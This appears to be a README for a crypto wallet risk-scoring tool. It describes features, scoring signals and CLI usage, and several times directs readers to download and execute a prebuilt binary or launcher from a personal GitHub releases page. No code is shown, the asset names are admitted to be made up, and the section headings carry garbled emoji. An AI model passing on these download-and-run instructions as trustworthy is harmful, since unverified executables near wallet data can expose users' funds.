# Wallet Data Processor ‚Äî Crypto Wallet Safety Analyzer Tool üîçüîí

A tool to evaluate crypto wallet safety. It inspects transaction history, risk signals, contract links, address clusters, and on-chain flags. Use it to classify wallet risk, detect scams, and gather actionable indicators.

## Features ‚úÖ

- Address scoring: compute a safety score per wallet.
- Heuristic flags: phishing, mixer use, high outgoing flows, linked contracts.
- Clustering: group addresses by on-chain link, common nonces, internal txs.
- Temporal analysis: trace funds over time and detect sudden drains.
- Token support: ERC-20, ERC-721, ERC-1155 (extendable).
- Export: JSON, CSV, and PDF report.
- CLI: run batch jobs on address lists.
- API-ready: modular core allows lightweight API wrapper.

---

## How it works ‚öôÔ∏è

1. The tool pulls on-chain data by calling node endpoints or public APIs.
2. It normalizes transactions and token flows into a unified schema.
3. It applies heuristics and ML models to mark risk factors.
4. It clusters addresses using graph metrics and shared activity.
5. It computes a final score that balances risk signals and historical context.
6. It outputs a human-readable report and machine JSON.

Key outputs:
- safety_score (0-100)
- flags (list of triggers)
- cluster_id
- top_incoming / top_outgoing
- recommended_actions

---

## Architecture diagram üß≠

- CLI / API layer
- Orchestration and worker pool
- On-chain fetchers (RPC / API adapters)
- Normalizer
- Risk engine (heuristics + model)
- Clusterer (graph engine)
- Exporter (JSON/CSV/PDF)

Core modules stay small and testable. The risk engine accepts pluggable rules and model weights.

## Quick install (Linux / macOS) üñ•Ô∏è

Prerequisites:
- Python 3.10+ or Node 16+ (project supports both runtimes; choose your stack)
- jq (for JSON checks)
- curl or wget
- unzip or tar

Steps:
1. Clone the repo or download a release asset.
2. Extract the archive.
3. Run the binary or script in the release.

Download a release asset from https://github.com/GVA-2007/Wallet-Data-Processor/releases. The release contains a packaged build. Download the asset and execute the included run script or binary.

Example (made-up release asset names):
- wallet-data-processor-v1.0.0.tar.gz
- run.sh (Linux/macOS)
- run.ps1 (Windows)
- wdp.exe (Windows standalone)

Run:
- Linux/macOS:
  - tar -xzf wallet-data-processor-v1.0.0.tar.gz
  - cd wallet-data-processor
  - chmod +x run.sh
  - ./run.sh --help
- Windows:
  - unzip wallet-data-processor-v1.0.0.zip
  - double-click wdp.exe or run run.ps1 in PowerShell

If the release link fails, check the Releases section in the repository for assets.

## Download and run a release (explicit) ‚¨áÔ∏è

Download the packaged release and execute the included runtime file from the Releases page:
https://github.com/GVA-2007/Wallet-Data-Processor/releases

The release contains:
- wallet-data-processor-v1.0.0.tar.gz ‚Äî packaged app
- run.sh ‚Äî launcher for Unix
- wdp.exe ‚Äî Windows binary
- docs/ ‚Äî sample configs and rule sets

After download, run the launcher to start an interactive session or a batch job.

---

## CLI usage examples üßæ

Basic scan:
- wdp scan --address 0xAbC...123 --chain ethereum --out report.json

Batch run:
- wdp batch --file addresses.csv --concurrency 8 --out reports/

Run with API key for a preferred provider:
- WDP_API_KEY=xxx wdp scan --address 0xAbC...123 --provider alchemy

Flags:
- --chain [ethereum|polygon|bsc]
- --since YYYY-MM-DD
- --until YYYY-MM-DD
- --output [json|csv|pdf]
- --concurrency N

Examples produce a JSON like:
{
  "address":"0xAbC...123",
  "safety_score":34,
  "flags":["high_outgoing", "linked_mixer"],
  "cluster_id":"cluster-987",
  "top_tokens": [{"symbol":"USDT","amount":1200}]
}

---

## Input and output formats üì§üì•

Input:
- Single address string
- CSV: address,chain
- JSON array of addresses with metadata

Output:
- JSON report (detailed)
- CSV summary (bulk)
- PDF report (human version)

JSON schema highlights:
- address
- chain
- safety_score
- flags []
- transactions []
- cluster { id, peers, edges_count }
- assets []

## Risk model and signals üß†

Signals:
- Known scam list hit (hash or address)
- High outgoing ratio (over X% of inflow)
- Unusual token approvals
- Interaction with mixers or sanctioned contracts
- Rapid chain hops (bridge pattern)
- Large single transfer to unknown address
- Use of proxy or stealth contracts
- Reused nonces across addresses

Model:
- Weighted heuristic baseline
- Optional classifier trained on labeled incidents
- Explainable scores with per-signal contribution
- Rule weights configurable via YAML

Scoring:
- 0 to 100, where 0 means dangerous and 100 means clean.
- Scores derive from signal weights and recency factors.

---

## Data sources and privacy üîó

Supported sources:
- Public RPC nodes (geth, parity)
- Providers: Alchemy, Infura, QuickNode
- Etherscan-like APIs for historical logs
- Custom indexer endpoints

Privacy:
- The tool fetches on-chain public data only.
- You may host the tool locally to avoid external calls.
- Configurable provider lets you use your own node.

---

## Tests and validation ‚úÖ

Unit tests:
- Core normalizer
- Clusterer functions
- Scoring rules

Integration tests:
- Sample addresses with known outcomes
- End-to-end runs against a mock node

Run tests:
- Python: pytest tests/
- Node: npm test

Test data includes sanitized transaction sets and known scam cases to verify signal detection.

---

## Performance and scaling ‚ö°

- Worker pool handles large batch jobs.
- Cache layer reduces repeated RPC calls.
- Graph engine streams edges to avoid full in-memory builds.
- Use `--concurrency` to control parallel fetches.

Benchmarks (example):
- 100 addresses, average 500 tx each -> ~8 minutes on a 4-core machine
- Results vary by provider rate limits and network latency

---

## Integrations and API üîå

- Use the core library as a module in your service.
- Wrap CLI in a small HTTP API:
  - POST /scan { address, chain }
  - GET /report/{id}
- Integrate with alerting: Slack, webhook, or syslog.

Export connectors:
- CSV for BI tools
- JSON for SIEMs
- PDF for audit

---
